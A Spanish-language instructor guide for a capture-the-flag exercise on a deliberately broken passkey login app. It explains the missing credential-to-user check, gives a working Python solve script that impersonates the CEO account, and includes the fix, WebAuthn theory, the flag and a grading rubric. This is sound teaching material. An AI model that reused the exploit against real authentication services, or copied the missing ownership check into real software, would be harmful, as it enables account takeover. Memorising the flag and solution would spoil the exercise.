# Guía del instructor — CTF "Passwordless de Cartón" (HackerBank)

Documento para el equipo organizador del **Hacking Day de Córdoba**. Contiene
la solución completa, la explicación de cada vulnerabilidad intencional, el
material teórico de FIDO2/WebAuthn, la rúbrica de evaluación y las notas de
montaje del evento.

> Este desafío es 100% educativo y ético. Todos los datos son ficticios.

---

## 1. Objetivo pedagógico

Enseñar, **por contraste**, cómo funciona FIDO2/WebAuthn real mostrando una
implementación TRUCHA que hace todo mal. El estudiante ataca la versión mala y,
al resolverla, entiende exactamente qué garantías le da la versión buena.

El aprendizaje central: un servidor de autenticación no solo debe verificar que
una firma sea **válida**, sino **a quién pertenece la credencial que firma**.
FIDO2/WebAuthn real ata cada credencial a su dueño y comprueba ese *binding* en
cada login (`allowCredentials`); sin ese chequeo, cualquier passkey válida sirve
para entrar como cualquiera. Como bonus, el diseño refuerza que el servidor
—igual que FIDO2 real— **nunca guarda claves privadas**: no hay nada que robar.

## 2. Diseño de la app y la vulnerabilidad intencional

Como FIDO2 real, el servidor solo guarda claves **públicas** (tabla
`credentials`); la privada de cada passkey vive del lado del cliente. Endpoints:

| Endpoint | Qué hace |
|---|---|
| `POST /auth/register` | `{username, credential_id, public_key}` → registra una passkey (solo la pública). Bloqueado si la cuenta tiene el registro cerrado (el CEO). |
| `POST /auth/challenge` | `{username}` → `{challenge, allow_credentials}`. `allow_credentials` son los `credential_id` de ESE usuario (lo que un cliente honesto usaría). |
| `POST /auth/verify` | `{username, credential_id, challenge, signature}` → verifica la firma y **abre sesión como `username`**. |

Buscar el string `VULN` en `app.py`. Hay **una** vulnerabilidad central:

- **VULN (binding credencial→usuario):** en `/auth/verify` el server valida que
  la firma sea correcta para la clave pública de la credencial presentada, pero
  **no** valida que esa credencial pertenezca al `username` reclamado. Falta, a
  propósito, el chequeo `credential["user_id"] == user["id"]` (y/o que el
  `credential_id` esté en `allow_credentials` del usuario).

Detalle de diseño que evita el atajo trivial: el CEO tiene
`passkey_registration_open=0` (su passkey se aprovisiona en el `seed`), así
**nadie puede registrar una passkey nueva directamente para el CEO**. El atacante
se ve forzado a usar la confusión de credencial.

## 3. Solución paso a paso

Usuarios: `alumno` (registro abierto), `ceo` (objetivo, registro cerrado),
señuelos `lmoreno / dferreyra / sibarra`.

### Capa 1 — Reconocimiento del flujo (Burp)

Con Burp interceptando, ir a `http://localhost:5000/login`, escribir `alumno` y
tocar el botón de huella. En el proxy aparecen, en orden:

1. `POST /auth/register` con `{"username":"alumno","credential_id":"...","public_key":"-----BEGIN PUBLIC KEY-----..."}`
   → el navegador generó su passkey y registró **solo la clave pública**.
2. `POST /auth/challenge` con `{"username":"alumno"}` → `{"challenge":"...","allow_credentials":["..."]}`.
3. `POST /auth/verify` con `{"username","credential_id","challenge","signature"}` → sesión.

**Aprendizaje:** el flujo es register → challenge → firma → verify, y la clave
privada **nunca** aparece en ninguna request (bien, como FIDO2 real). El fallo no
está a la vista: hay que razonar sobre qué chequea (y qué no) el `verify`.

### Capa 2 — Descubrir la falta de binding

Probar, en el Repeater de Burp, a mezclar identidades en `/auth/verify`:

- Registrar una passkey propia en `alumno` (Capa 1) deja un `credential_id`
  nuestro con su clave.
- Intentar registrar una passkey directamente para `ceo` → `403 El registro de
  passkeys está deshabilitado para esta cuenta`. Ese callejón sin salida es la
  pista: al CEO no se le puede registrar una passkey, pero **quizás su `verify`
  acepte la nuestra**.
- Pedir un challenge de `ceo`, firmarlo con **nuestra** clave y mandarlo a
  `/auth/verify` con `username: ceo` pero **nuestro** `credential_id`.

**Aprendizaje:** el server verifica la firma contra la credencial que le pasás,
sin comprobar que sea del `ceo`. En FIDO2 real, `verify` solo acepta credenciales
que estén en `allowCredentials` del usuario.

### Capa 3 — Suplantar al CEO (Python)

1. Generar un par propio (la privada nunca sale de tu máquina).
2. Registrar la pública en `alumno`: `POST /auth/register`.
3. Pedir un challenge fresco del `ceo` y firmarlo con tu clave (ECDSA-SHA256,
   raw `r||s` de 64 bytes).
4. `POST /auth/verify` con `{username: "ceo", credential_id: <el tuyo>, challenge, signature}`
   → login como CEO → el dashboard muestra el **código ganador**.

**Detalles que lo hacen no-trivial:**
- El `challenge` es de un solo uso y con TTL: pedir uno fresco y firmarlo enseguida.
- La firma en el "cable" es **raw `r||s` (64 bytes)**, no DER; `cryptography`
  firma en DER, hay que convertir DER → raw.

### Script de resolución

El repo incluye [`solve.py`](solve.py), que ejecuta el ataque. Su núcleo:

```python
import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

BASE = "http://localhost:5000"
s = requests.Session()

# (1) mi propio par; la privada nunca sale de acá
priv = ec.generate_private_key(ec.SECP256R1())
pub_pem = priv.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
cred_id = "attacker-" + priv.private_numbers().private_value.to_bytes(32, "big").hex()[:24]

# (2) registro MI passkey en una cuenta con registro abierto
s.post(f"{BASE}/auth/register", json={"username": "alumno", "credential_id": cred_id, "public_key": pub_pem})

# (3) challenge del CEO, firmado con MI clave (DER -> raw r||s)
ch = s.post(f"{BASE}/auth/challenge", json={"username": "ceo"}).json()["challenge"]
der = priv.sign(ch.encode(), ec.ECDSA(hashes.SHA256()))
r, ss = decode_dss_signature(der)
sig = (r.to_bytes(32, "big") + ss.to_bytes(32, "big")).hex()

# (4) verify diciendo que soy el CEO, pero con MI credential_id -> entra
out = s.post(f"{BASE}/auth/verify",
             json={"username": "ceo", "credential_id": cred_id, "challenge": ch, "signature": sig}).json()
print(out)  # login OK -> leer /dashboard para la flag
```

Salida esperada: login exitoso y, al leer `/dashboard`, el código ganador.

### La corrección (para el debate de mitigación)

En `/auth/verify`, después de verificar la firma, agregar el binding:

```python
if credential["user_id"] != user["id"]:
    return jsonify(ok=False, error="Credencial no registrada para este usuario."), 401
```

(equivalente a exigir que el `credential_id` esté en `allow_credentials` del
usuario, que es lo que hace WebAuthn real).

## 4. El código ganador (flag)

```
f27ad11c21afef4f4c54a3930698f616
```

Es un hash MD5 ficticio (coherente con el formato de la plataforma
softwareseguro.com.ar). Es determinístico: `seed.py` lo asigna siempre a la
cuenta del CEO, así que es el mismo en cada instancia mientras no se cambie el
seed. Si se quiere una flag distinta por evento, editar `CEO_WINNING_CODE` en
`seed.py`.

## 5. Material teórico: cómo funciona FIDO2/WebAuthn real

Referencia del flujo real (capturado de webauthn.io, la demo oficial):

**Registro:**
1. `POST /registration/options` → el cliente manda `{username, algorithms:[ed25519, es256, rs256], attestation:"none", ...}`.
2. El servidor responde `challenge`, `rp:{id,name}`, `user:{id,name}` y
   `pubKeyCredParams` (algoritmos, ej. -8, -7, -257).
3. El navegador llama `navigator.credentials.create()` → Windows Hello / Touch
   ID verifica al usuario y el **TPM genera el par de claves** y firma.
4. `POST /registration/verification` → viajan el `clientDataJSON` (con
   `type:"webauthn.create"`, el `challenge`, el `origin`), el
   `attestationObject` y la **clave PÚBLICA**. Nunca la privada.
5. El servidor verifica y guarda la clave pública.

**Autenticación:**
1. `POST /authentication/options` con el username → challenge **nuevo** +
   `allowCredentials` con el `credential_id`.
2. El navegador llama `navigator.credentials.get()` → el TPM firma el challenge
   con la clave privada, desbloqueada por biometría local.
3. `POST /authentication/verification` → viajan el `clientDataJSON` (con
   `type:"webauthn.get"`), el `authenticatorData` (flags UP/UV + `signCount`) y
   la **firma**. Nunca la clave privada.
4. El servidor verifica la firma con la clave pública guardada.

**Puntos clave:**
- El challenge de registro y el de autenticación son **distintos** (previene
  replay).
- El `signCount` incrementa en cada uso (detecta clonación del autenticador).
- El `rpIdHash` (SHA-256 del dominio) ata la firma al **dominio** (previene
  phishing).
- La clave privada **jamás** aparece en ninguna request.

### Qué es el TPM / Secure Enclave

Es un chip de hardware (o zona aislada del procesador) diseñado para generar y
guardar claves de forma que **no se puedan extraer**: la clave privada se crea
adentro y las operaciones de firma ocurren adentro; el software solo recibe el
resultado. Por eso, aunque un atacante comprometa el sistema operativo o robe
la base de datos del servidor, no puede obtener la clave privada.

### Tabla comparativa (la que ve el estudiante al ganar)

| Lo que rompiste (FIDO2 de cartón) | Cómo lo previene FIDO2 real |
|---|---|
| Entraste como el CEO usando TU propia passkey | FIDO2 solo acepta las credenciales registradas de ESE usuario (`allowCredentials`) |
| El servidor verificó la firma pero no de quién era la credencial | Cada credencial está ligada a su dueño y el server lo comprueba en cada login |
| Te hiciste pasar por el CEO sin tener su clave | La firma exige presencia física + verificación biométrica en el hardware del dueño |
| Nunca hizo falta robar ninguna clave privada | El servidor solo guarda claves PÚBLICAS: no hay secreto que robar |
| Todo el ataque se hizo de forma remota | FIDO2 ata cada firma al `origin` (dominio) → resistente a phishing |

## 6. Rúbrica de evaluación sugerida

El informe del estudiante debería incluir:

| Criterio | Qué se espera | Puntaje |
|---|---|---|
| Reconocimiento (Capa 1) | Capturas de Burp del flujo `register → challenge → verify` y descripción (la privada nunca viaja; el server solo guarda públicas). | 15% |
| Descubrir el fallo (Capa 2) | Evidencia de que `/auth/verify` acepta una credencial que no pertenece al usuario (falta de binding); el `403` del registro del CEO como pista. | 30% |
| Suplantación (Capa 3) | Script/pasos: registrar passkey propia, firmar el challenge del CEO (raw r||s, P-256) con `credential_id` propio, obtener la flag. | 30% |
| Mitigación | Propuesta concreta: verificar el binding credencial→usuario (`allowCredentials`) en `verify`. | 25% |

Flag correcta (`f27ad11c21afef4f4c54a3930698f616`) como condición necesaria.

## 7. Notas de montaje para el Hacking Day

### Tiempo estimado de resolución
- Reconocimiento (Capa 1): 15-25 min.
- Descubrir la falta de binding (Capa 2): 25-45 min.
- Suplantación con Python (Capa 3): 25-40 min.
- **Total estimado: 65-110 minutos** según nivel del participante.

### Cómo resetear el entorno entre participantes
- Con Docker: `docker compose restart` (o `down` + `up`). `seed.py` recrea la
  base en cada arranque (resiembra usuarios y reaprovisiona la passkey del CEO).
- Local: volver a correr `python seed.py`.
- No hace falta borrar nada a mano: no hay estado persistente entre corridas.
  (Las passkeys que el navegador guarda en `localStorage` son por dispositivo;
  para empezar de cero en el mismo navegador, limpiar el `localStorage` del sitio.)

### Problemas comunes

| Problema | Causa probable | Solución |
|---|---|---|
| El botón de huella no hace nada | El navegador no ejecutó `script.js` o hubo un error JS | Abrir la consola de DevTools; verificar que el usuario exista. |
| `403` al loguearse como `ceo` en la web | El CEO tiene el registro de passkeys cerrado (es a propósito) | No es un bug: hay que resolverlo con la confusión de credencial, no registrando una passkey para el CEO. |
| "Firma inválida" al resolver en Python | Se envió la firma en DER en vez de raw r||s | Convertir DER → r‖s (64 bytes) como en `solve.py`. |
| "Challenge inválido, vencido o ya usado" | Se reusó un challenge viejo o expiró (TTL 5 min) | Pedir un challenge nuevo justo antes de firmar. |
| El puerto 5000 está ocupado | Otra instancia corriendo | `docker compose down` de la anterior, o cambiar el mapeo de puerto. |

### Recordatorio ético para la apertura del taller
Dejar explícito que las técnicas (análisis de una API de autenticación, forja de
firmas, abuso de autorización) se practican acá sobre un blanco ficticio y con
permiso, y que aplicarlas contra sistemas reales sin autorización es ilegal. El
valor está en entender la defensa: por qué FIDO2 real hace imposible este ataque.
